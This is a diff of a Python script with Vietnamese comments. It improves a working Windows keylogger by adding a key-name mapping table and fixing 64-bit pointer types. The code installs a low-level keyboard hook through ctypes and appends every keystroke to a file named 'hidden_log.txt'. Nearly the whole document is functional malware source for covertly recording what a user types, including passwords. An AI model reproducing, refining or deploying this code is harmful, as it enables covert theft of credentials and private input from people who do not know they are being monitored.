@@ -2,13 +2,14 @@ import ctypes
 from ctypes import wintypes
 import sys
 import time
+
 # Khai báo các thư viện lõi của Windows
 user32 = ctypes.windll.user32
 kernel32 = ctypes.windll.kernel32
 PM_REMOVE = 1
+
 # =====================================================================
-# KHẮC PHỤC LỖI TRÊN WINDOWS 64-BIT (ARM64)
-# Định nghĩa rõ kiểu dữ liệu để tránh bị OS cắt xén con trỏ (Pointer Truncation)
+# KHẮC PHỤC LỖI OVERFLOW TRÊN WINDOWS 64-BIT
 # =====================================================================
 user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p, wintypes.HINSTANCE, wintypes.DWORD]
 user32.SetWindowsHookExW.restype = wintypes.HHOOK
@@ -16,7 +17,7 @@ user32.SetWindowsHookExW.restype = wintypes.HHOOK
 user32.UnhookWindowsHookEx.argtypes = [wintypes.HHOOK]
 user32.UnhookWindowsHookEx.restype = wintypes.BOOL
 
-user32.CallNextHookEx.argtypes = [wintypes.HHOOK, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
+user32.CallNextHookEx.argtypes = [wintypes.HHOOK, ctypes.c_int, wintypes.WPARAM, ctypes.c_void_p]
 user32.CallNextHookEx.restype = wintypes.LPARAM
 
 kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
@@ -27,6 +28,21 @@ WH_KEYBOARD_LL = 13
 WM_KEYDOWN = 0x0100
 LOG_FILE = "hidden_log.txt"
 
+# BẢNG ÁNH XẠ MỞ RỘNG: Chuyển mã số thành ký tự tường minh
+VK_MAP = {
+    8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]\n", 
+    16: "[SHIFT]", 160: "[L-SHIFT]", 161: "[R-SHIFT]",
+    17: "[CTRL]", 162: "[L-CTRL]", 163: "[R-CTRL]", 
+    18: "[ALT]", 164: "[L-ALT]", 165: "[R-ALT]",
+    20: "[CAPSLOCK]", 27: "[ESC]", 32: " ",
+    37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
+    46: "[DELETE]", 91: "[WIN]", 92: "[WIN]",
+    # Các phím ký tự đặc biệt (thường xuất hiện dưới dạng số trong log của bạn)
+    186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/", 
+    192: "`", 219: "[", 220: "\\", 221: "]", 222: "'",
+    231: "" # Loại bỏ nhiễu UniKey
+}
+
 # Cấu trúc dữ liệu chứa thông tin phím bấm
 class KBDLLHOOKSTRUCT(ctypes.Structure):
     _fields_ = [("vkCode", wintypes.DWORD),
@@ -35,72 +51,68 @@ class KBDLLHOOKSTRUCT(ctypes.Structure):
                 ("time", wintypes.DWORD),
                 ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]
 
-# Sử dụng wintypes.LPARAM thay cho c_long để tương thích an toàn với 64-bit
 HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
 
 hook_id = None
 
 # Hàm Callback: Nơi đánh chặn dữ liệu
 def hook_callback(nCode, wParam, lParam):
-   if nCode >= 0 and wParam == WM_KEYDOWN:
-      kbd_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
-      vk_code = kbd_struct.vkCode
-      
-      char = chr(vk_code) if 32 <= vk_code <= 126 else f"[{vk_code}]"
-      
-      with open(LOG_FILE, "a", encoding="utf-8") as f:
-         f.write(char)
-         
-   return user32.CallNextHookEx(hook_id, nCode, wParam, lParam)
+    global hook_id
+    if nCode >= 0 and wParam == WM_KEYDOWN:
+        kbd_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+        vk_code = kbd_struct.vkCode
+        
+        # Kiểm tra trong bảng mã mở rộng
+        if vk_code in VK_MAP:
+            char = VK_MAP[vk_code]
+        elif 32 <= vk_code <= 126:
+            char = chr(vk_code)
+        else:
+            char = f"[{vk_code}]"
+        
+        if char:
+            with open(LOG_FILE, "a", encoding="utf-8") as f:
+                f.write(char)
+                
+    return user32.CallNextHookEx(hook_id, nCode, wParam, ctypes.c_void_p(lParam))
 
 c_callback = HOOKPROC(hook_callback)
 
 def main():
-   global hook_id
-   
-   # 1. Lấy Handle của tiến trình hiện tại (Python.exe)
-   h_mod = kernel32.GetModuleHandleW(None)
-   
-   # 2. Chuyển hàm Python thành con trỏ C hợp lệ
-   hook_pointer = ctypes.cast(c_callback, ctypes.c_void_p)
-   
-   # 3. Đăng ký Hook
-   hook_id = user32.SetWindowsHookExW(
-      WH_KEYBOARD_LL,
-      hook_pointer,
-      h_mod,
-      0 
-   )
+    global hook_id
+    sys.stdout.reconfigure(encoding='utf-8')
+    h_mod = kernel32.GetModuleHandleW(None)
+    hook_pointer = ctypes.cast(c_callback, ctypes.c_void_p)
+    
+    hook_id = user32.SetWindowsHookExW(
+        WH_KEYBOARD_LL,
+        hook_pointer,
+        h_mod,
+        0 
+    )
 
-   if not hook_id:
-      # Lấy mã lỗi lõi của Windows để phân tích
-      error_code = ctypes.GetLastError()
-      print(f"Lỗi: Không thể thiết lập Hook.")
-      print(f"Mã lỗi Windows (Error Code): {error_code}")
-      print("Gợi ý: Nếu mã lỗi là 5 (Access Denied) hoặc 126, hãy kiểm tra lại Windows Defender và chạy CMD bằng quyền Administrator.")
-      sys.exit(1)
+    if not hook_id:
+        print(f"Lỗi: Không thể thiết lập Hook.")
+        sys.exit(1)
 
-   print("Keylogger đang chạy ngầm... (Nhấn Ctrl+C trong terminal để thoát)")
+    print("Keylogger dang chay... (Bang ma mo rong da kich hoat)")
 
-   msg = wintypes.MSG()
-   try:
-      # 2. THAY VÒNG LẶP GETMESSAGE BẰNG PEEKMESSAGE
-      while True:
-         # Nhìn trộm xem có thông điệp nào không
-         if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, PM_REMOVE):
-               user32.TranslateMessage(ctypes.byref(msg))
-               user32.DispatchMessageW(ctypes.byref(msg))
-         else:
-               # 3. YIELD TÀI NGUYÊN: Nghỉ 10 mili-giây để Python kịp bắt lệnh Ctrl+C
-               time.sleep(0.01) 
+    msg = wintypes.MSG()
+    try:
+        while True:
+            if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, PM_REMOVE):
+                user32.TranslateMessage(ctypes.byref(msg))
+                user32.DispatchMessageW(ctypes.byref(msg))
+            else:
+                time.sleep(0.01) 
                   
-   except KeyboardInterrupt:
-      print("\n[!] Đã nhận lệnh dừng từ người dùng (Ctrl+C).")
+    except KeyboardInterrupt:
+        print("\n[!] Da dung.")
       
-   finally:
-      if hook_id:
-         user32.UnhookWindowsHookEx(hook_id)
-         print("[*] Đã gỡ bỏ Hook an toàn và giải phóng bộ nhớ. Chương trình kết thúc.")
+    finally:
+        if hook_id:
+            user32.UnhookWindowsHookEx(hook_id)
+            print("[*] Da go bo Hook an toan.")
 
 if __name__ == "__main__":
     main()
